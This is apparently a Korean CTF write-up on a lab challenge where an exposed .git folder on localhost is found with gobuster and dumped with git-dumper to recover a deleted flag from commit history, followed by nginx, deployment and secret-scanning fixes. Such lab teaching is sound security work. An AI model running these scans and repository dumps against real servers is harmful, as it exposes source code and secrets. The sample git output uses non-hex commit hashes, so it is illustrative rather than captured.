+++
title = "VulnABLE CTF [LUXORA] Write-up: Info Disclosure 🥈 Silver"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Info Disclosure", "Silver", ".git Leak", "Git-dumper", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Info Disclosure 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: Crypto & Secrets Layer (Information Disclosure)
- **난이도**: 🥈 Silver
- **타겟 경로**: `/info-disc/silver`
- **목표**: 배포 과정의 실수로 인해 웹 서버에 노출된 `.git` 폴더를 발견하고, 전용 도구(`git-dumper`)를 사용해 전체 레포지토리를 복원(Dump)한 뒤, 소스코드 커밋 기록(History)에 숨겨진 플래그를 찾아내라.

---

## 🕵️‍♂️ 1. 정보 수집 및 취약점 탐색 (Reconnaissance)

`/info-disc/silver` 경로 자체에는 아무런 특별한 기능이 없습니다. 하지만 Bronze 단계에서 썼던 디렉터리 스캐너를 돌려봅니다.

```bash
$ gobuster dir -u http://localhost:3000/info-disc/silver -w /usr/share/wordlists/dirb/common.txt
```

**[검색 결과]**
```text
/.git/HEAD (Status: 200)
/.git/config (Status: 200)
```

**[해커의 사고 과정]**
1. 개발자가 소스코드를 서버에 배포할 때 `git clone`을 통째로 써버렸거나, 빌드 폴더에 `.git` 디렉터리가 섞여 들어간 전형적인 **Git Leakage** 취약점이다!
2. `.git` 폴더 안에는 소스코드 전체, 모든 과거 커밋 내역(History), 심지어 삭제된 비밀번호나 플래그까지 전부 압축되어 들어있다.
3. 이 폴더를 내 컴퓨터로 그대로 복사(Dump)해 오면, 원본 소스코드를 내 마음대로 뜯어볼 수 있다.

---

## 💥 2. 레포지토리 복원 (Exploitation: Git Dumping)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(Directory Brute Force)--> [ Web Server ]
                                          |-- /config.php.bak
                                          |-- /.git/
                                          |-- Returns Sensitive Files
```


`.git` 폴더 안의 파일들은 서로 얽혀 있기 때문에 하나씩 `curl` 로 받는 것은 무리입니다. 해커들이 애용하는 `git-dumper` (또는 `dvcs-ripper`) 라는 도구를 사용합니다.

### 💡 Git-dumper 실행
리눅스 터미널에서 툴을 실행하여 원격 서버의 `.git` 폴더를 내 로컬 디렉터리(`silver_repo`)로 긁어옵니다.

```bash
# git-dumper 설치 (파이썬 환경)
# pip install git-dumper

$ git-dumper http://localhost:3000/info-disc/silver/.git/ ./silver_repo
```

**[실행 로그]**
```text
[-] Fetching http://localhost:3000/info-disc/silver/.git/HEAD
[-] Fetching http://localhost:3000/info-disc/silver/.git/config
[-] Fetching objects...
[-] Repository dumped successfully!
```

---

## 🚀 3. 소스코드 및 커밋 히스토리 분석

이제 다운로드 받은 `silver_repo` 디렉터리로 들어가서 원본 소스코드를 분석합니다.

```bash
$ cd ./silver_repo
$ git status
```

현재 코드를 살펴봐도 플래그가 보이지 않는다면, 개발자가 이전에 플래그를 올려놓고 "앗, 실수!" 하면서 지운 **과거 커밋(Commit)**을 뒤져야 합니다.

### 💡 Git Log 및 Diff 분석
모든 커밋 내역을 확인합니다.

```bash
$ git log --oneline
```
```text
a1b2c3d Fix typo in index.html
e4f5g6h Remove sensitive test flag <-- 수상한 커밋 발견!
7h8i9j0 Initial commit
```

수상한 커밋(`e4f5g6h`)에서 어떤 내용이 지워졌는지 확인합니다.

```bash
$ git show e4f5g6h
```

### 🔍 숨겨진 정보 발견 (Diff 결과)
```diff
commit e4f5g6h
Author: Dev Team <dev@luxora.test>
Date:   Wed Nov 1 10:00:00 2023 +0000

    Remove sensitive test flag

diff --git a/config.js b/config.js
index 1234abc..5678def 100644
--- a/config.js
+++ b/config.js
@@ -5,6 +5,5 @@ module.exports = {
     db: "mongodb://localhost:27017/luxora",
     api_key: process.env.API_KEY,
-    // REMOVE THIS BEFORE PROD
-    // test_flag: "FLAG{INFO_🥈_GIT_HISTORY_LEAK_D4E5F6}"
+    test_flag: "removed"
 }
```

빙고! 개발자가 커밋으로 지웠던 플래그 기록이 `.git` 폴더에 영원히 남아있어 발견할 수 있었습니다.

---

## 🚩 4. 롸잇업 결론 및 플래그

파일 시스템의 일부인 메타데이터 폴더(`.git`) 노출이, 단순히 파일 몇 개를 보여주는 수준을 넘어 애플리케이션의 뼈대와 과거의 흑역사(삭제된 비밀번호 등)를 모조리 유출하는 재앙적 결과를 초래함을 증명했습니다.

**🔥 획득한 플래그:**
`FLAG{INFO_🥈_GIT_HISTORY_LEAK_D4E5F6}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
배포 아키텍처(Architecture)의 결함입니다. 웹에서 접근 가능한 경로(Document Root)에 버전 관리 파일이 노출되었습니다.

* **안전한 패치 가이드**
1. **웹 서버 레벨의 강력한 차단 (가장 중요)**: Nginx나 Apache 설정에서 `.git`, `.svn`, `.env` 와 같은 메타/설정 폴더로 향하는 모든 HTTP 요청을 차단(404 또는 403)해야 합니다.
   ```nginx
   # Nginx: .git 폴더 및 그 하위 파일들에 대한 접근을 전면 차단
   location ~ /\.git {
       deny all;
   }
   ```
2. **배포 스크립트 수정**: 코드를 서버에 배포할 때 `rsync`나 `scp`를 쓰거나, 빌드 툴(Webpack, Docker)을 통해 최종 산출물(빌드 파일)만 복사하고, `.git` 폴더 자체는 절대 운영 서버로 복사하지 않아야 합니다.
3. **비밀번호 커밋 방지 (Secret Scanning)**: 애초에 깃허브(Git)에 비밀번호나 토큰을 하드코딩해서 올리지 않도록, `trufflehog` 나 `git-secrets` 같은 도구를 CI/CD 파이프라인에 추가하여 커밋 자체를 막아야 합니다.